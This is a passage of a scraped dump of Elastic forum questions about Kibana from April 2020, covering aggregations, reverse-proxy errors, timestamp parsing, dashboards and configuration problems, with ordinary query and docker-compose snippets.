{\"path\": \"models/performance/mse\", \"time\": \"2020-04-21T08:00:00.00000Z\", \"value\": 1.2, \"labels\": {\"customer_id\": \"1\", \"model_name\": \"rf\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/r2\", \"time\": \"2020-04-21T08:00:00.00000Z\", \"value\": 0.5, \"labels\": {\"customer_id\": \"1\", \"model_name\": \"rf\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/mse\", \"time\": \"2020-04-21T08:00:00.00000Z\", \"value\": 2.4, \"labels\": {\"customer_id\": \"1\", \"model_name\": \"nn\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/r2\", \"time\": \"2020-04-21T08:00:00.00000Z\", \"value\": 0.2, \"labels\": {\"customer_id\": \"1\", \"model_name\": \"nn\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/mse\", \"time\": \"2020-04-20T08:00:00.00000Z\", \"value\": 10, \"labels\": {\"customer_id\": \"2\", \"model_name\": \"rf\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/r2\", \"time\": \"2020-04-20T08:00:00.00000Z\", \"value\": 0.8, \"labels\": {\"customer_id\": \"2\", \"model_name\": \"rf\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/mse\", \"time\": \"2020-04-20T08:00:00.00000Z\", \"value\": 20, \"labels\": {\"customer_id\": \"2\", \"model_name\": \"nn\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/r2\", \"time\": \"2020-04-20T08:00:00.00000Z\", \"value\": -1, \"labels\": {\"customer_id\": \"2\", \"model_name\": \"nn\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/mse\", \"time\": \"2020-04-21T08:00:00.00000Z\", \"value\": 12, \"labels\": {\"customer_id\": \"2\", \"model_name\": \"rf\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/r2\", \"time\": \"2020-04-21T08:00:00.00000Z\", \"value\": 0.3, \"labels\": {\"customer_id\": \"2\", \"model_name\": \"rf\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/mse\", \"time\": \"2020-04-21T08:00:00.00000Z\", \"value\": 24, \"labels\": {\"customer_id\": \"2\", \"model_name\": \"nn\"}} {\"index\": {\"_index\": \"metrics-01\"}} {\"path\": \"models/performance/r2\", \"time\": \"2020-04-21T08:00:00.00000Z\", \"value\": -1, \"labels\": {\"customer_id\": \"2\", \"model_name\": \"nn\"}} The Data Table (what I could achieve) Screenshot 2020-04-22 at 13.36.593732×998 200 KB What is missing is an additional column showing the difference (division or subtraction) between the Avg MSE (Yesterday) column the Avg MSE column. I could get this information using a Bucket Script Aggregation ran using the Dev Tools, is there anyway to get these results (run a similar query) into the Data Table? GET metrics-01/_search { \"query\": { \"match_all\": {} }, \"size\": 0, \"aggs\": { \"customers\": { \"terms\": { \"field\": \"labels.customer_id\", \"order\": { \"_key\": \"asc\" }, \"size\": 500 }, \"aggs\": { \"models\": { \"terms\": { \"field\": \"labels.model_name\", \"order\": { \"_key\": \"asc\" }, \"size\": 10 }, \"aggs\": { \"avg_mse_all\": { \"filter\": { \"query_string\": { \"analyze_wildcard\": true, \"query\": \"\"\" path.raw: \"models/performance/mse\" \"\"\" } }, \"aggs\": { \"avg_mse\": { \"avg\": { \"field\": \"value\" } } } }, \"avg_mse_yesterday\": { \"filter\": { \"query_string\": { \"analyze_wildcard\": true, \"query\": \"\"\" path.raw: \"models/performance/mse\" AND time: [now-1d/d TO now/d] \"\"\" } }, \"aggs\": { \"avg_mse\": { \"avg\": { \"field\": \"value\" } } } }, \"avg_mse_difference\": { \"bucket_script\": { \"buckets_path\": { \"avg_mse_all_value\": \"avg_mse_all>avg_mse\", \"avg_mse_yesterday_value\": \"avg_mse_yesterday>avg_mse\" }, \"script\": \"params.avg_mse_yesterday_value - params.avg_mse_all_value\" } } } } } } } } I know that some plugins might provide a solution, but I never used any and I am not sure which one is the best option and what are the disadvantages of using kibana plugins. Any help or direction is appreciated. Thank you!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e4381675-9461-4265-ae8a-fe3a8e7a6377",
    "url": "https://discuss.elastic.co/t/nginx-reverse-proxy-failing-with-csp-error/229318",
    "title": "Nginx reverse proxy failing with csp error",
    "category": [
      "Kibana"
    ],
    "author": "KenneyHe",
    "date": "April 22, 2020, 4:48pm April 22, 2020, 6:16pm April 22, 2020, 6:35pm April 22, 2020, 6:50pm",
    "body": "Hi, Being a bit of a technocrat, I tried the latest 7.6.2 ES/Kibana releases and can't understand this error message after configuring nginx 1.15-alpine reverse proxy. Even after repeatedly restarting with kibana with csp.strict on/off, the error still happens... Is this a software issue? Can I workaround it? Thanks in advance... configuration: latest alpine latest ES, Kibana latest nginx stable ubuntu 18.04 host latest docker 19.x latest docker-compose v3.3 template steps: # client side $ curl https://au-001.fortressiq.com/ ... // Since this is an unsafe inline script, this code will not run // in browsers that support content security policy(CSP). This is // intentional as we check for the existence of __kbnCspNotEnforced__ in // bootstrap. window.__kbnCspNotEnforced__ = true; # server side docker-compose.yaml version: '3.3' services: nginx: image: nginx:1.15-alpine command: \"/bin/sh -c 'while :; do sleep 6h & wait $${!}; nginx -s reload; done & nginx -g \\\"daemon off;\\\"'\" ports: - \"80:80\" - \"443:443\" volumes: - ./data/certbot/conf:/etc/letsencrypt - ./data/certbot/www:/var/www/certbot - ./data/nginx:/etc/nginx/conf.d networks: - elastic certbot: image: certbot/certbot entrypoint: \"/bin/sh -c 'trap exit TERM; while :; do certbot renew; sleep 12h & wait $${!}; done;'\" volumes: - ./data/certbot/conf:/etc/letsencrypt - ./data/certbot/www:/var/www/certbot kibana: image: docker.elastic.co/kibana/kibana:7.6.2 container_name: kibana # see https://github.com/elastic/kibana/blob/master/src/dev/build/tasks/os_packages/docker_generator/resources/bin/kibana-docker volumes: - ./kibana.yml:/usr/share/kibana/config/kibana.yml ulimits: memlock: soft: -1 hard: -1 ports: - 5601:5601 networks: - elastic similary configuration as below ref: Nginx reverse proxy with rewrite and app/kibana#/discover using official syntax from github documentation ref: https://github.com/elastic/kibana/blob/master/src/dev/build/tasks/os_packages/docker_generator/resources/bin/kibana-docker",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "8834e5e3-3864-499d-8e7f-cc61ebb8bcc4",
    "url": "https://discuss.elastic.co/t/why-cant-kibana-deployed-in-windows-display-all-the-data-that-satisfies-the-condition/228492",
    "title": "Why can't kibana deployed in Windows display all the data that satisfies the condition",
    "category": [
      "Kibana"
    ],
    "author": "Echo_yu",
    "date": "April 17, 2020, 10:33am April 22, 2020, 6:43pm",
    "body": "Hello, I found that the kibana I deployed in Windows cannot display all the data that meets the criteria. When I refreshed discover in Kibana, I found that there was a new record showing, but one of the records was missing. It seems kibana displaying is unstable. Could you give me some suggestions on this issue? How do I set up kibana to stabilize the data display？ Looking forward to your help. Thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "bb452747-0162-4601-87af-45edf63e0369",
    "url": "https://discuss.elastic.co/t/css-404-error-in-kibana/229152",
    "title": "Css 404 error in kibana",
    "category": [
      "Kibana"
    ],
    "author": "Yungyoung_Ok",
    "date": "April 22, 2020, 1:22am April 22, 2020, 6:39pm",
    "body": "hello. I have a proxy server in front of kibana and I am accessing kibana. When I check the proxy log, there are times when a 404 error occurs, and the request is as follows. http://kibanaip:port/built_assets/css/plugins/kibana/build/kibana/src/legacy/core_plugins/kibana/public/index.scss http://kibanaip:port/built_assets/css/plugins/kibana/build/node_modules/@elastic/eui/src/global_styling/variables/_typography.scss http://kibanaip:port/built_assets/css/plugins/kibana/build/node_modules/@elastic/eui/src/global_styling/mixins/_shadow.scss So when I access the path by connecting to the server, I really don't have the file. kibana was installed with rpm, and even when tested on Windows, the files are not installed. What is this and how do I fix it?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "92ec3134-a9e0-4e25-98ae-d5d4b4cf5558",
    "url": "https://discuss.elastic.co/t/kibana-is-showing-wrong-timestamp-when-it-is-correct-in-logstash/228700",
    "title": "Kibana is showing wrong timestamp when it is correct in logstash",
    "category": [
      "Kibana"
    ],
    "author": "lohit18",
    "date": "April 22, 2020, 6:36pm April 22, 2020, 6:38pm",
    "body": "Dear Team, Kindly help me how to get correct timestamp as base from csv file in kibana for visualization. because of timestamp i am unable to visualize charts. Below is kibana showing timestamp { \"_index\": \"energy\", \"_type\": \"_doc\", \"_id\": \"FlBwf4555a1PovFz\", \"_version\": 1, \"_score\": 0, \"_source\": { \"path\": \"C:/User/Downloads/Powerdata.csv\", \"Data_Type_Filter\": \"FALSE\", \"today_filter\": \"FALSE\", **\"@timestamp\": \"2020-04-05T13:19:00.141Z\",** **\"tags\": [** ** \"_dateparsefailure\"** ** ],** \"TodnYest\": \"FALSE\", \"P_calc\": \"2.353\", \"data_type\": \"P_Area\", \"P_Area_for_1\": \"0.007130303\", \"@version\": \"1\", \"Local_Time\": [ \"3/27/2020 22:23\", \"3/27/2020\" ], \"TestCurrentTemp\": \"84\\\\xF8C\", \"Parameter_Value\": null }, \"fields\": { **\"@timestamp\": [** ** \"2020-04-05T13:19:00.141Z\"** ** ]** } } below is logstash showing timestamp. { \"Current_Time\" => \"3/30/2020 20:24\", \"user_id\" => \"CAL_189\", \"Data_Type_Filter\" => \"FALSE\", \"path\" => \"C:/User/Downloads/Powerdata.csv\", \"@version\" => \"1\", \"P_Area_for_1\": \"0.007130303\", \"timestamp\" => \"3/31/2020 0:27\\\\r\", ****\"@timestamp\" => 2020-01-30T12:57:00.000Z** ---> \" this timestamp should be show in kibana \"** } Kindly help me",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "09eb0528-e828-41e0-a41b-204dd078d678",
    "url": "https://discuss.elastic.co/t/configuration-keys/229280",
    "title": "Configuration keys",
    "category": [
      "Kibana"
    ],
    "author": "compengineer",
    "date": "April 22, 2020, 9:02pm April 22, 2020, 3:03pm April 22, 2020, 3:58pm April 22, 2020, 6:34pm",
    "body": "I am getting a fatal error. FATAL Error: Unknown configuration key(s): \"elastic.username\", \"elastic.password\". Check for spelling errors. I have already added the correct configuration keys. I have no idea where kibana is getting these keys from because they are not in my kibana.yml file. elasticsearch.username and elasticsearch.password are the keys i am using in the kibana.yml file.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "cab92143-b0f1-41ed-8b8b-150be7fb9c1c",
    "url": "https://discuss.elastic.co/t/quartiles-in-heatmaps/229022",
    "title": "Quartiles in heatmaps",
    "category": [
      "Kibana"
    ],
    "author": "sanzcans",
    "date": "April 21, 2020, 11:22am April 22, 2020, 4:36pm April 22, 2020, 5:00pm April 22, 2020, 6:29pm",
    "body": "Hello everybody! I am trying to create three heatmaps in Kibana 6.8.7 using a different percentile in each graph: 50, 75 and 90. For the first one I can use the \"Median\" aggregation but, what about the other two measures? Is there any way to calculate them? Thank you very much! Santi",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9facb829-c689-4c05-9477-f1248953e553",
    "url": "https://discuss.elastic.co/t/search-for-ip-address-does-not-return-results/229326",
    "title": "Search for IP address does not return results",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 22, 2020, 5:43pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "78d86a0e-06dd-482c-b322-42eae3f2f1cd",
    "url": "https://discuss.elastic.co/t/remotely-accessing-kibana-web-interface/228415",
    "title": "Remotely accessing Kibana Web Interface",
    "category": [
      "Kibana"
    ],
    "author": "droidus",
    "date": "April 16, 2020, 10:28pm April 18, 2020, 6:43pm April 19, 2020, 7:48pm April 19, 2020, 11:18pm April 20, 2020, 3:46pm April 20, 2020, 4:27pm April 20, 2020, 11:17pm April 21, 2020, 2:53am April 21, 2020, 12:21pm April 22, 2020, 12:23am April 22, 2020, 5:06pm",
    "body": "I am trying to access the Kibana interface remotely and locally. When I change server.host to the IP of the machine, it does not load locally nor remotely. When I set it to 0.0.0.0, I can only access locally. I made sure ufw is off. Selinux is not installed. I've also restarted the Kibana docker container. Is there anything else I can try?",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "1b51eaa2-a77e-4243-a4ff-3231e1365f90",
    "url": "https://discuss.elastic.co/t/kibana-6-3-in-a-dev-mode-constantly-restarting-the-server-due-to-changes-i-didnt-make/229301",
    "title": "Kibana 6.3 in a --dev mode constantly restarting the server due to changes I didn't make",
    "category": [
      "Kibana"
    ],
    "author": "Vlad_Udod",
    "date": "April 22, 2020, 5:05pm April 22, 2020, 4:31pm April 22, 2020, 5:05pm",
    "body": "Kibana 6.3 constantly restarting the server due to changes I didn't make It works fine without --dev. The only option to get it working is to delete an \"optimize\" folder then start in prod mode, drop it and then start --dev. That is super weird behavior What caused constant restarting the server? Do you know any possible way to fix it? kibana996×202 11 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d43d3049-2f05-4d51-b5c8-24fbb9bc5d5b",
    "url": "https://discuss.elastic.co/t/kibana-query-displaying-incorrect-results/228703",
    "title": "Kibana Query Displaying Incorrect Results",
    "category": [
      "Kibana"
    ],
    "author": "vikramaddagulla",
    "date": "April 19, 2020, 6:58am April 20, 2020, 8:17am April 22, 2020, 4:42pm",
    "body": "Hi, I am trying to view the logs which have higher time-taken parameter. In many of the logs, I can see that the time taken parameter is logged in as 8.000, 15.500, 15.753 etc If I try to search with timetaken > 8.000 Ideally, it should have displayed all results more than 8 but instead it displays only one result as shown below. image965×369 70.3 KB I had changed my query as below and then I can see the results. Any suggestion what is going wrong ? image1661×642 152 KB Ideally the result set for timetaken > 8.000 and timetaken > 10.000 should have been identical.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c52e43b3-86b2-48a8-a0c2-72191f57f408",
    "url": "https://discuss.elastic.co/t/maps-crashes-elastic-cloud-kibana-instance-on-gcp/229122",
    "title": "Maps crashes Elastic Cloud Kibana Instance on GCP",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 21, 2020, 7:46pm April 21, 2020, 7:53pm April 22, 2020, 3:11am April 21, 2020, 10:19pm April 22, 2020, 3:18am April 22, 2020, 4:40pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ffb777cf-4764-4a68-8292-b77f65abfac6",
    "url": "https://discuss.elastic.co/t/visualize-specific-string-from-field/229012",
    "title": "Visualize specific string from field",
    "category": [
      "Kibana"
    ],
    "author": "Jose_H",
    "date": "April 21, 2020, 10:24am April 21, 2020, 5:46pm April 22, 2020, 1:37pm April 22, 2020, 4:27pm",
    "body": "Hi all. We are trying to visualize the count of users connected to our VPN from the event.original field (Cisco FirePower syslogs collected through filebeat) but are unsure how to strip and only show users instead of the whole message string: Indexed Data event.original %FTD-6-722022: Group <RA-VPN-GRP> User <john.doe> IP <192.168.1.1> UDP SVC connection established without compression Kibana Visual: anyconnect_VPN-Users1647×866 81.7 KB Any help will be greatly be appreciated.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "dd914c90-cdaf-4c96-9d52-99e54d368ca5",
    "url": "https://discuss.elastic.co/t/use-same-dashboard-on-another-index/228461",
    "title": "Use same dashboard on another index",
    "category": [
      "Kibana"
    ],
    "author": "manojkrishna561994",
    "date": "April 17, 2020, 7:32am April 22, 2020, 4:17pm",
    "body": "I have created dashboard with multiple visualisations in it on index name: test_1. Now i want to use this dashboard on another index name: test_2 which has same fields and same data in fact. I have downloaded the dashboard ndjson file and uploaded it.. and did inspect on it and changed the index name and in the ndjson file also i have renamed the index name to test_2 but the dashboard is not showing data. Is this is how i need to apply the same dashboard on another index which is of same format? Kindly suggest.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f843e767-49b3-4d48-923d-30feeb4c2791",
    "url": "https://discuss.elastic.co/t/confirm-the-time-range-of-now-1d-d-in-kibana/228455",
    "title": "Confirm the time range of “now-1d/d” in kibana",
    "category": [
      "Kibana"
    ],
    "author": "Echo_yu",
    "date": "April 17, 2020, 6:39am April 22, 2020, 4:04pm",
    "body": "Hi, suppose now is 2020-04-17 14:36:36 and I would like to make sure that \"now-1d/d\" in kibana refers to the time range between 2020-04-16 00:00:00 to 2020-04-16 23:59:59 right?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d43a8dd7-98fe-4c68-ae75-976f817f5185",
    "url": "https://discuss.elastic.co/t/why-cant-i-see-kibana-in-my-browser-instead-of-it-i-see-the-classic-error-404-not-found/229098",
    "title": "Why can't I see kibana in my browser? instead of it, I see the classic error 404 not found",
    "category": [
      "Kibana"
    ],
    "author": "Serge2020",
    "date": "April 21, 2020, 4:48pm April 21, 2020, 8:57pm April 22, 2020, 4:00pm",
    "body": "I have been trying to instal elasticsearch with all its components; the first time it was great but I'm a beginner in in IT, so I decided unistall it to practice, them when I tried to install it again, I got the error I mentioned before. I gotta be honest guys! I didn't know that when you uninstall elasticsearch you uninstall its components, so i tried to uninstall kibana too, but I think I deleted files that might be I've shouldn't. this is the guide I used to install it https://www.digitalocean.com/community/tutorials/how-to-install-elasticsearch-logstash-and-kibana-elastic-stack-on-ubuntu-18-04-es The server has Ubuntu 18.4 and it has nginx intalled correcty. I hope you can help me please!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "aed0e3b1-237a-4d4e-81ed-d8f320934729",
    "url": "https://discuss.elastic.co/t/lucene-query-unique-values/229057",
    "title": "Lucene query unique values",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 21, 2020, 2:19pm April 22, 2020, 3:34pm April 22, 2020, 3:46pm April 22, 2020, 3:59pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "96e63f03-92bf-40e4-b442-140566a5d7e0",
    "url": "https://discuss.elastic.co/t/unable-to-plot-custom-data-on-y-axis/229085",
    "title": "Unable to plot custom data on Y axis",
    "category": [
      "Kibana"
    ],
    "author": "ishan1",
    "date": "April 21, 2020, 3:45pm April 21, 2020, 4:00pm April 22, 2020, 5:57am April 22, 2020, 1:44pm April 22, 2020, 3:27pm April 22, 2020, 3:38pm April 22, 2020, 3:46pm",
    "body": "I have 1000 lines of data which is in below format and I want to plot a line graph in Kibana with response time on y axis and time on x axis and then plot the data based on Interface name. In below data there is only 1 interface name but in 1000 lins of data there can be unique 3-4 interface name. When i am plotting this data i am only getting option of count on y axis and time on x axis (which is ok) but i am not able to map response time filed on y axis. {\"level\":\"INFO\",\"CommandName \":\"Get\",\"timestamp\":\"2020-04-02T00:01:10.224\",\"Status\":\"SUCCESS\",\"MethodName\":\"executeCommandAndProcessResponse()\",\"ResponseTime\":\"63\",\"RID\":\"http-f799140e7128\",\"ResponseCode\":\"0\",\"Msisdn\":\"2348064427272\",\"InterfaceName\":\"XYZ\",\"ClassName\":\"com.ericsson.fdp.business.command.impl.TransactionCommand\"} Looking forward for a solution..",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "7eeb1b36-4106-4d46-90a5-785037a5f618",
    "url": "https://discuss.elastic.co/t/free-reporting/229287",
    "title": "Free reporting",
    "category": [
      "Kibana"
    ],
    "author": "ilhem",
    "date": "April 22, 2020, 2:47pm April 22, 2020, 3:26pm",
    "body": "Hi, I'm going to implement a java application that connects to elasticsearch and creates kibana graphics using the rest API. later I will improve my application to integrate these graphics to generate a pdf report. is there a free way to do this reporting? because otherwise I will organize another plan to reach my final goal which is get free reporting.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "23924310-4d8c-4ee1-9f98-35ddbbd2ec80",
    "url": "https://discuss.elastic.co/t/displayed-x-axis-shifts/229298",
    "title": "Displayed X-axis shifts",
    "category": [
      "Kibana"
    ],
    "author": "gtdkibana",
    "date": "April 22, 2020, 3:19pm",
    "body": "(topic withdrawn by author, will be automatically deleted in 24 hours unless flagged)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5ecd0baf-28a9-462e-98d5-b7a144d41a51",
    "url": "https://discuss.elastic.co/t/sparkline-chart/229162",
    "title": "Sparkline chart",
    "category": [
      "Kibana"
    ],
    "author": "dataplatform12345",
    "date": "April 22, 2020, 2:45am April 22, 2020, 3:16pm",
    "body": "Hi, In Kibana visualization, is it possible to create a result with sparkline chart as one of the columns in the result? Ideally to combine the trend line in one column and aggregated values in all other columns in the result. Example: en.wikipedia.org Sparkline A sparkline is a very small line chart, typically drawn without axes or coordinates. It presents the general shape of the variation (typically over time) in some measurement, such as temperature or stock market price, in a simple and highly condensed way. Sparklines are small enough to be embedded in text, or several sparklines may be grouped together as elements of a small multiple. Whereas the typical chart is designed to show as much data as possible, and is set off from the flow of text, spar... Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "38e60dba-782d-4b52-826d-b83ea30bd6ac",
    "url": "https://discuss.elastic.co/t/problems-while-uploading-geojson-data-in-kibana-maps-elastic-cloud/228936",
    "title": "Problems while uploading Geojson data in Kibana Maps (Elastic Cloud)",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 20, 2020, 9:52pm April 21, 2020, 2:23am April 21, 2020, 3:06am April 21, 2020, 3:19am April 21, 2020, 3:49am April 21, 2020, 7:54am April 21, 2020, 1:59pm April 21, 2020, 2:48pm April 21, 2020, 7:53pm April 21, 2020, 9:38pm April 22, 2020, 9:36am April 22, 2020, 1:45pm April 22, 2020, 2:47pm April 22, 2020, 3:02pm",
    "body": "",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "37726633-efc4-48f6-bfc7-9815d395954a",
    "url": "https://discuss.elastic.co/t/request-keyword-doesnt-refresh/229025",
    "title": "Request.keyword doesn't refresh",
    "category": [
      "Kibana"
    ],
    "author": "Jeffreyshoptrader",
    "date": "April 21, 2020, 11:15am April 21, 2020, 3:36pm April 22, 2020, 6:23am April 22, 2020, 2:09pm",
    "body": "Hi there, I'm creating a dashboard with the most viewed pages. Unfortunately my request.keyword, which includes my pages, doesn't refresh. Knipsel1923×972 112 KB I've visited the top page multiple times on different devices, but it's still stuck on 4. Why doesn't it refresh and change the count?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4cb125f7-3162-48ba-a6df-6b6d45cd99d6",
    "url": "https://discuss.elastic.co/t/is-there-any-configuration-i-can-change-to-force-kibana-to-show-all-values-received-on-a-vertical-bar-graph/228579",
    "title": "Is there any configuration I can change to force Kibana to show all values received on a Vertical Bar graph?",
    "category": [
      "Kibana"
    ],
    "author": "rafael_muynarsk",
    "date": "April 17, 2020, 9:20pm April 22, 2020, 1:42pm",
    "body": "I've a working dashboard with Kibana that's automatically receiving values and distributing the sum of the data daily like the following: Screenshot from 2020-04-17 17-25-071878×176 15.9 KB The problem here is that Kibana is not showing all the values that it has received when the values are too much smaller than the other received values that are visible. Let's say that I zoom at the end of the last graph: Screenshot from 2020-04-17 17-25-07 (copy)1878×176 16.2 KB In my case I end up seeing this: Screenshot from 2020-04-17 17-25-271877×150 11.2 KB Those values were completely invisible when they were together with the huge values that I got on other days. Is there any way that I can force Kibana to show all values that it has received on the Vertical Bar graph? Even when they seem to be insignificant among the other values that are visible?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7b1a30af-608b-438f-b186-a872788e78d6",
    "url": "https://discuss.elastic.co/t/kibana-forced-session-timeout-at-login-on-windows/229194",
    "title": "Kibana forced session timeout at login on Windows",
    "category": [
      "Kibana"
    ],
    "author": "vladtepes",
    "date": "April 22, 2020, 12:59pm",
    "body": "Hi! I have created a 3-node elasticsearch cluster with a F5 load-balanced kibana on two nodes. I see a peculiar behavior, where after I login with a superuser login (file realm) it is redirecting to: /login?msg=SESSION_EXPIRED&next=%2Fapp%2Fkibana I tried logging in directly to the server FQDN:port and that works as expected without any redirect. I removed persistence and the LB algorithm was set to round-robin, but the problem is still there. Do you guys have a suggestion what might be the problem? Update: It seems to be related to how kibana is affected by elastic search master node change. If I deliberately stop the Elastic Search master node service, I will also need to restart the Kibana service to avoid this redirect loop: login -> redirect session expired -> login. So far I found no other explanation for this behavior.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "551500eb-4952-4fd5-9aa8-d820b8d141c6",
    "url": "https://discuss.elastic.co/t/kibana-logs-application-tiebreaker-field-grayed-out/228375",
    "title": "Kibana \"Logs\" application Tiebreaker field grayed out",
    "category": [
      "Kibana"
    ],
    "author": "cotjoey",
    "date": "April 16, 2020, 5:01pm April 20, 2020, 3:33pm April 20, 2020, 5:22pm April 20, 2020, 6:01pm April 22, 2020, 12:54pm",
    "body": "Hello, I am trying to set up a tiebreaker field in the the Kibana \"Logs\" application, but it is grayed out. There is a banner showing \"Deprecation Notice\". I am unsure how to set that tiebreaker field now that it's deprecated. In the kibana.yml file maybe? Please help me figure this out for Kibana 7.6.2. Joey",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "8e5bff8c-a2f9-4521-85f7-45269f5fb416",
    "url": "https://discuss.elastic.co/t/visualize-based-on-grouped-documents-using-element-value/229237",
    "title": "Visualize based on grouped documents using element value",
    "category": [
      "Kibana"
    ],
    "author": "abregman",
    "date": "April 22, 2020, 11:11am April 22, 2020, 11:57am April 22, 2020, 11:57am",
    "body": "Hey, assuming I have the following documents that represent passengers: {‘name’: ‘Mario’, preferable_seats: [2,3,4], car: 2} {‘name’: ‘Luigi’, preferable_seats: [1,4,5], car: 1, } {‘name’: ‘Toad’, preferable_seats: [1, 2], car: 2, } Now, this is what I have indexed in elasticsearch but when working with the data and creating visualizations in Kibana I would like to actually refer to cars. So basically I want for example to: Create a pie chart of the number of passengers in each car Show overall preferable seats per car. So for example, car 2 list will be: [1, 2, 3, 4] Now to the question - what would be the best way to tackle this?: Create car documents prior to indexing the data or do it directly in Kibana? If in KIbana, it would be nice if someone could show me how for example I can do “Create a pie chart of the number of passengers in each car\".",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4a03c68f-6611-4f83-b39a-3e43d0ff5c16",
    "url": "https://discuss.elastic.co/t/kibana-dashboard-how-to-change-the-syslog-message-format/228123",
    "title": "Kibana dashboard - how to change the syslog message format",
    "category": [
      "Kibana"
    ],
    "author": "Rico",
    "date": "April 15, 2020, 12:38pm April 15, 2020, 1:30pm April 22, 2020, 11:43am",
    "body": "Hello everybody, a customer is using the Kibana Dashboard and determined that port numbers has a \",\" (e.g. \"29,842\") in all syslog messages. Is it possible to change the format so it is displaying \"29842\" instead as port number and what must be done to get this? I am not familiar with the Kibana Dashboard and really thankful for every hint. Thanka a lot! Rico",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "03a7b7e9-27df-4506-a61e-7d4a9ac888cf",
    "url": "https://discuss.elastic.co/t/kibana-drill-down-not-working-as-expected/228934",
    "title": "Kibana Drill-Down not working as expected",
    "category": [
      "Kibana"
    ],
    "author": "Paul_Gege",
    "date": "April 20, 2020, 9:02pm April 22, 2020, 11:25am",
    "body": "Hi all, I have been playing around with making drill-downs however when I change the format for a field within my index to a URL, it directs me to the appropriate visualization but the query does not actually take place. For example: image724×101 4.64 KB When I click \"Male\", it directs me to the following dashboard (which is the correct visualization but the query does not execute): image1225×632 43.2 KB Realize that it populates the query input appropriately, however the graph is wrong because the query does not take effect (even if I click \"Refresh\"). But when I open up the same visualization and type out the same query manually and press \"Refresh\", I get the results I want: image1227×629 42.7 KB My question is, why does my URL not automatically execute the query? Is there something i'm missing?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f4e08757-f727-4cfd-ace4-9457d2f9ba24",
    "url": "https://discuss.elastic.co/t/extraction-query-for-monitor/228918",
    "title": "Extraction query for monitor",
    "category": [
      "Kibana"
    ],
    "author": "Rashmita_Shetty",
    "date": "April 20, 2020, 6:33pm April 22, 2020, 11:04am",
    "body": "Hello, I have recently built a few alerts in Kibana (7.1.1). The alerts that I have using the extraction method is to query a specific value in the field : CustomerEndpoint address. I am trying to understand, if I had to add 2 values in the Endpoint address, how will I do so? Should I be using array/ OR operator? < { \"match_phrase\": { \"CustomerEndpoint.Address\": { \"query\": \"xxxxx12345\", \"slop\": 0, \"zero_terms_query\": \"NONE\", \"boost\": 1 } } } ] Under the action items in trigger > there is a box for message preview , how can I add the some fields from _source in that message?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7a86ec0f-cdbb-417d-902a-0df618e087f9",
    "url": "https://discuss.elastic.co/t/aws-to-kibana/229221",
    "title": "AWS to Kibana",
    "category": [
      "Kibana"
    ],
    "author": "John_Carlo",
    "date": "April 22, 2020, 9:44am April 22, 2020, 9:45am April 22, 2020, 9:47am April 22, 2020, 9:48am April 22, 2020, 9:53am April 22, 2020, 9:54am April 22, 2020, 10:00am April 22, 2020, 10:05am",
    "body": "hi. is there any other way to connect my aws ES to kibana 7.6.2?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "ae9296ec-de61-4297-a988-2c9615fc3ab0",
    "url": "https://discuss.elastic.co/t/multiple-timepickers-in-canvas/225247",
    "title": "Multiple timepickers in Canvas",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "March 27, 2020, 1:48pm March 30, 2020, 11:28am April 22, 2020, 8:42am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "df30ff2e-1721-4202-bc75-d5335d7e8657",
    "url": "https://discuss.elastic.co/t/elastic-cloud-kibana-with-single-sign-on-from-azure-active-directory/228947",
    "title": "Elastic Cloud Kibana with Single Sign On from Azure Active Directory",
    "category": [
      "Kibana"
    ],
    "author": "jpigott",
    "date": "April 21, 2020, 2:31am April 21, 2020, 2:54am April 21, 2020, 3:15am April 21, 2020, 3:26am April 21, 2020, 5:59am April 21, 2020, 1:07pm April 22, 2020, 8:39am",
